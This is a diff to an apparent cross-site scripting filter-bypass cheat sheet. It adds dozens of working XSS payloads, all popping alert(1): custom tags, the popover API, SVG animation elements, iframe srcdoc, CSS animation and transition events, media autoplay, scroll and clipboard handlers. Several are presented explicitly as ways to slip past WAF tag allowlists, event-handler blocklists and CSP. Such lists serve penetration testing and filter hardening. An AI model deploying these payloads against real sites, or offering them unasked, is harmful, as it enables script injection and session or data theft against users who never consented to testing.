@@ -48,52 +48,122 @@ Strategy: find the gap between what the filter rejects and what the browser acce
 <embed src="javascript:alert(1)">
 ```
 
+### Custom / unknown tags (bypass tag allowlists entirely)
+Custom elements inherit all standard HTML event handler support per spec.
+WAFs that maintain a tag allowlist will miss these.
+```html
+<xss onfocus=alert(1) autofocus tabindex=1>
+<xss onclick=alert(1) style=display:block>click</xss>
+<xss oncontentvisibilityautostatechange=alert(1) style="display:block;content-visibility:auto">
+<custom-element onmouseover=alert(1) style=display:block>hover</custom-element>
+```
+
+### Popover API (modern browsers — Chrome 114+, Safari 17+)
+```html
+<div popover id=x>
+<button popovertarget=x onbeforetoggle=alert(1)>click</button>
+<div popover ontoggle=alert(1) id=y>
+<button popovertarget=y>click</button>
+```
+
 ### SVG and MathML contexts
 ```html
 <svg onload=alert(1)>
 <svg><script>alert(1)</script></svg>
-<svg><animate onbegin=alert(1) attributeName=x>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<svg><animateMotion onbegin=alert(1) dur=1s>
+<svg><animateTransform onbegin=alert(1) attributeName=transform type=rotate dur=1s>
 <svg><a><animate attributeName=href values=javascript:alert(1) /><text>click</text></a>
 <math><maction actiontype=statusline#javascript:alert(1)>CLICK
-<svg><set onbegin=alert(1)>
+<svg><set onbegin=alert(1) attributeName=x dur=1s>
 <svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>#x">
+```
+
+### iframe srcdoc (bypasses src-based CSP restrictions)
+```html
+<iframe srcdoc="<script>alert(document.domain)<\/script>">
+<iframe srcdoc="<img src=x onerror=alert(document.domain)>">
+<!-- srcdoc content is not fetched from a URL — bypasses strict-src CSP if iframe-src is allowed -->
 ```
 
 ---
 
 ## 2. EVENT HANDLER BYPASSES
 
-### Universal event handlers (no user interaction)
+### No user interaction — automatic execution
 ```html
+<!-- Classic load events -->
 <img src=x onerror=alert(1)>
 <img src=x onerror="alert(1)">
 <img src=x onerror='alert(1)'>
-<img src=x onerror=alert`1`>          <!-- backtick — no parens -->
+<img src=x onerror=alert`1`>          <!-- backtick — no parens needed -->
 <body onload=alert(1)>
 <iframe onload=alert(1)>
 <svg onload=alert(1)>
-<input autofocus onfocus=alert(1)>     <!-- focuses automatically -->
+<input autofocus onfocus=alert(1)>    <!-- autofocus fires onfocus immediately -->
 <select autofocus onfocus=alert(1)>
 <textarea autofocus onfocus=alert(1)>
+
+<!-- CSS animation events — fire when animation starts/ends (no click) -->
+<style>@keyframes x{from{opacity:1}to{opacity:0}}</style>
+<img style="animation-name:x;animation-duration:1s" onanimationstart=alert(1)>
+<img style="animation-name:x;animation-duration:1s" onanimationend=alert(1)>
+<div style="animation-name:x;animation-duration:1s" onanimationiteration=alert(1)>
+<!-- webkit-prefixed (Chrome/Safari) -->
+<img style="animation-name:x;animation-duration:1s" onwebkitanimationend=alert(1)>
+
+<!-- CSS transition events — fire on style property transition -->
+<style>div{width:0;transition:width 1s}</style>
+<div ontransitionstart=alert(1) style="width:100px">x</div>
+<div ontransitionend=alert(1) style="width:100px">x</div>
+<div onwebkittransitionend=alert(1) style="width:100px">x</div>
+
+<!-- Media events (require autoplay or preload=auto) -->
+<audio src=1 autoplay oncanplay=alert(1)>
+<video src=1 autoplay oncanplay=alert(1)>
+<audio src=1 autoplay onloadedmetadata=alert(1)>
+<video src=1 autoplay onplay=alert(1)>
+
+<!-- SVG animation — fires on begin/end of SVG animation -->
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<svg><animateMotion onbegin=alert(1) dur=1s>
+<svg><set onbegin=alert(1) attributeName=x dur=1s>
+
+<!-- Scroll events (fire when page content scrolls) -->
+<div onscrollend=alert(1) style="overflow:scroll;height:1px;width:1px">
+  <div style="height:1000px"></div>
+</div>
+
+<!-- Content visibility (fires when element enters/leaves viewport) -->
+<xss oncontentvisibilityautostatechange=alert(1)
+     style="display:block;content-visibility:auto">x</xss>
 ```
 
-### Interaction-required (lower priority but useful for CSP bypass)
+### User interaction required (useful for CSP bypasses or when no-interaction blocked)
 ```html
 <a href=javascript:alert(1)>click</a>
 <a href="javascript:void(0)" onclick=alert(1)>click</a>
 <button onclick=alert(1)>click</button>
 <div onmouseover=alert(1)>hover</div>
 <div onclick=alert(1)>click</div>
-```
-
-### Less common event handlers (bypass event handler blocklists)
-```html
-onpointerenter  onpointerover  onpointermove
-onanimationend  onanimationstart  ontransitionend
-onformdata  onscroll  onresize
-oncopy  oncut  onpaste
-ondrag  ondragstart  ondrop  ondragenter
-onwheel  onkeydown  onkeypress
+<!-- Pointer events — less commonly blocked -->
+<div onpointerenter=alert(1)>hover</div>
+<div onpointerdown=alert(1)>click</div>
+<!-- Clipboard events -->
+<div oncopy=alert(1) style=display:block>select and copy me</div>
+<div onpaste=alert(1) contenteditable>paste here</div>
+<!-- Drag events -->
+<div ondragstart=alert(1) draggable=true>drag me</div>
+<div ondrop=alert(1) ondragover="return false">drop here</div>
+<!-- Scroll/wheel -->
+<div onwheel=alert(1) style="overflow:scroll;height:50px;width:50px">
+  <div style="height:1000px"></div>
+</div>
+<!-- Safari-specific -->
+<input onbeforepaste=alert(1)>
+<!-- Form events without submit -->
+<input type=text onformdata=alert(1) form=x>
+<form id=x onsubmit=return></form>
 ```
 
 ### Event handler without = (some parsers accept)
